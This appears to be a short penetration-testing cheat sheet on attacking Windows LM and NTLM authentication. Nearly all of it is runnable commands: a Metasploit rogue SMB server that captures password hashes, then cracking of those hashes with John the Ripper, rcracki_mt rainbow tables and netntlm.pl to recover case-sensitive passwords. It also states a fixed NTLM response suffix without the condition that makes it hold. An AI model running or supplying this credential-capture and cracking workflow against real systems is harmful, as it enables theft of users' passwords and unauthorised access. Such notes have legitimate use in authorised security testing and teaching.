# LM & NTLM Passwords
##### Capture Password Hash with Metasploit
```bash
msfconsole -q
use auxiliary/server/capture/smb
show options
# Set prefix for filename of captured hashes
set JOHNPWFILE hashes
run
```
##### Hash Format
```<user name>::<machine name>:<LM hash>:<NT hash>:<challenge used>```

When the password is seven characters or less, the last 8 bytes of the NTLM response will always be 2f85252cc731bb25.

##### Crack with John The Ripper
```bash
john --format=netlm hashpwd_netntlm_
```

##### Crack rcracki_mt and rainbow tables
```bash
sudo rcracki_mt -h <First 8 Bytes (16 characters) of LM Hash> -t 4 *.rti
# -t number of threads
```
##### Crack Remaining Password with netntlm, After Getting First 8 Characters From rcracki
```bash
locate netntlm
perl <Directory Where Stored>/netntlm.pl

sudo perl netntlm.pl --file <File Captured in Metasploit> --seed <Password Cracked by rcracki> 
# Returns all uppercase

# Run again with full password, to get case-sensitive password
sudo perl netntlm.pl --file <File Captured in Metasploit> --seed <Full Password Cracked by netntlm.pl> 
```

### LM & NTLM Passwords References
[Windows authentication attacks – part 1](https://blog.redforce.io/windows-authentication-and-attacks-part-1-ntlm/)